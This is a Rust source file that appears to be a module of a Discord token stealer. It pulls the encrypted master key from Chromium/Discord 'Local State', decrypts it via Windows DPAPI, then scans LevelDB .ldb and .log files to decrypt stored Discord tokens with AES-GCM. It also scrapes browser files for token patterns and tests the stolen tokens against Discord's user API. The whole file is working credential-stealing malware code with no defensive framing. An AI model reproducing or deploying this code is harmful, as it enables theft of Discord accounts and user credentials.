use serde_json::Value;
use winapi::um::dpapi::CryptUnprotectData;
use winapi::um::wincrypt::CRYPTOAPI_BLOB;
use aes_gcm::Aes256Gcm;
use aes_gcm::aead::{Aead, generic_array::GenericArray};
use aes_gcm::KeyInit;
use std::sync::Arc;
use std::sync::Mutex;
use regex::Regex;
use rayon::prelude::*;
use std::fs::File;
use std::io::Read;
use tokio;

use crate::global::utils;

pub async fn get_master_key(path: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let mut contents = String::new();
    let mut file = tokio::fs::File::open(path).await?;
    tokio::io::AsyncReadExt::read_to_string(&mut file, &mut contents).await?;
    
    // Use the decode function from the general_purpose engine in the base64 crate.
    // It decodes the Base64-encoded encrypted key.    
    let mut master_key = Vec::from(
        // Parse the JSON contents into a serde_json::Value.
        utils::decode_base64(&serde_json::from_str::<Value>(&contents)?["os_crypt"]["encrypted_key"]
        .as_str()
        // Convert the Option<&str> to a Result<&str, &str>.
        .ok_or(" ")?)?
        // Get a slice of the decoded bytes starting from the 6th byte (index 5).
        .as_slice()[5..]
        // Convert the slice to a Vec<u8>
        .to_vec());

    // Use the CryptUnprotectData function from the Windows API to decrypt the key,
    // using the Windows Data Protection API (DPAPI).
    let mut out_data = CRYPTOAPI_BLOB {
        cbData: 0,
        pbData: std::ptr::null_mut(),
    };

    let master;
    unsafe {
        // Get session key
        let _ = CryptUnprotectData(
            &mut CRYPTOAPI_BLOB {
                cbData: master_key.len() as u32,
                pbData: master_key.as_mut_ptr(),
            },
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            winapi::um::dpapi::CRYPTPROTECT_UI_FORBIDDEN,
            &mut out_data,
        );
        master = Vec::from_raw_parts(
            out_data.pbData,
            out_data.cbData as usize,
            out_data.cbData as usize,
        );
    };

    Ok(master)
}

fn decrypt_token(buff: &[u8], master_key: &[u8]) -> Result<String, String> {
    // Decrypt the AES 256 Buffer using the master key
    Ok(String::from_utf8_lossy(&Aes256Gcm::new(GenericArray::from_slice(master_key))
    .decrypt(GenericArray::from_slice(&buff[3..15]), &buff[15..])
    .map_err(|_| "Failed to decrypt password")?.as_slice()).to_string())
}

pub async fn check_token(token: &str) -> Result<(String, String), Box<dyn std::error::Error>> {
    // Check if token are valid
    let client = reqwest::Client::new();
    let response = client
        .get("https://discord.com/api/v9/users/@me")
        .header(reqwest::header::AUTHORIZATION, token)
        .send()
        .await?;
    
    Ok((
        response.status().as_str().to_string(),
        serde_json::from_str::<serde_json::Value>(&response.text().await?)?["id"]
            .as_str()
            .map(|s| s.to_string())
            .unwrap_or_default()
    ))
}

pub async fn get_discord_tokens(local_state_path: &str, path: &str, encrypted_regex_pattern: &Regex) -> Arc<Mutex<utils::Credentials>> {
    let new_credentials = Arc::new(Mutex::<utils::Credentials>::new(Default::default()));

    if std::path::Path::new(&local_state_path).exists() {
        let master_key = get_master_key(&local_state_path).await.unwrap();

            let entries = jwalk::WalkDir::new(path).into_iter();
            let _handles: Vec<_> = entries
                .map(|entry| entry.unwrap())  // Unwrap each entry
                .collect::<Vec<_>>()  // Collect into a Vec<DirEntry>
                .par_iter() // Convert Vec into a parallel iterator
                .map(|entry| {
                    let encrypted_regex_pattern = encrypted_regex_pattern.clone();
                    let new_credentials = new_credentials.clone();
                    let master_key = master_key.clone();
                    let filename = entry.path().to_owned();

                    rayon::spawn(move || {
                        let filename_str = filename.to_string_lossy();
                        if filename_str.ends_with(".ldb") || filename_str.ends_with(".log") {
                            if let Ok(mut file) = File::open(&filename) {
                                let mut contents: Vec<u8> = Vec::new();
                                let mut reader = std::io::BufReader::new(&mut file);
                                if let Ok(_) = reader.read_to_end(&mut contents) {
                                    for line in String::from_utf8_lossy(&contents).lines().map(|x| x.trim().to_string()) {
                                        for y in encrypted_regex_pattern.find_iter(&line) {
                                            if let Ok(token) = decrypt_token(&utils::decode_base64(y.as_str().split("dQw4w9WgXcQ:").collect::<Vec<_>>()[1]).unwrap()[..], &master_key) {
                                                new_credentials.lock().unwrap().token.push(token);
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    })
                }).collect();
    }
    new_credentials
}

pub async fn get_browser_tokens(path : &str, regex_pattern : &Regex, format : &[String]) -> Arc<Mutex<utils::Credentials>> {
    if !std::path::Path::new(&path).exists() {
        return Arc::new(Mutex::<utils::Credentials>::new(Default::default()));
    }

    let new_credentials = Arc::new(Mutex::<utils::Credentials>::new(Default::default()));
    let entries = jwalk::WalkDir::new(path).into_iter();
    let _handles: Vec<_> = entries
        .map(|entry| entry.unwrap())
        .collect::<Vec<_>>()
        .par_iter()
        .map(|entry| {
            let regex_pattern = regex_pattern.clone();
            let new_credentials = new_credentials.clone();
            let filename = entry.path().to_owned();
            let format = format.to_owned();

            rayon::spawn(move || {
                let filename_str = filename.to_string_lossy();
                if format.iter().any(|ext| filename_str.ends_with(ext)) {
                    if let Ok(mut file) = File::open(&filename) {
                        let mut contents: Vec<u8> = Vec::new();
                        let mut reader = std::io::BufReader::new(&mut file);

                        if let Ok(_) = reader.read_to_end(&mut contents) {
                            for line in String::from_utf8_lossy(&contents).lines().map(|x| x.trim().to_string()) {
                                for y in regex_pattern.find_iter(&line) {
                                    new_credentials.lock().unwrap().token.push(y.as_str().to_string());
                                }
                            }
                        }
                    }
                }
            })
    }).collect();
    new_credentials
}